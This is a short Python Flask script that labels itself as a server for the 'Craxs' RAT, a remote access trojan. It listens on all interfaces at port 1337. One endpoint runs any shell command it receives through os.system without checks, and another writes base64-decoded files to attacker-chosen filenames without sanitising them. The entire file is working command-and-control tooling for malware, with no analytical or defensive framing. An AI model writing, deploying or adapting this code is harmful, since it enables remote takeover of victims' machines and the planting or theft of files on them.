#!/usr/bin/env python3
from flask import Flask, request
import os, base64

app = Flask(__name__)
UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route('/')
def index():
    return "aaayafuj_Craxs_Rat_access Server Running..."

@app.route('/recv', methods=['POST'])
def recv():
    data = request.json
    cmd = data.get("cmd")
    if cmd:
        os.system(cmd)
    return "Command executed"

@app.route('/upload', methods=['POST'])
def upload():
    fdata = base64.b64decode(request.json["data"])
    fname = request.json["filename"]
    with open(os.path.join(UPLOAD_FOLDER, fname), "wb") as f:
        f.write(fdata)
    return "File received"

app.run(host='0.0.0.0', port=1337)
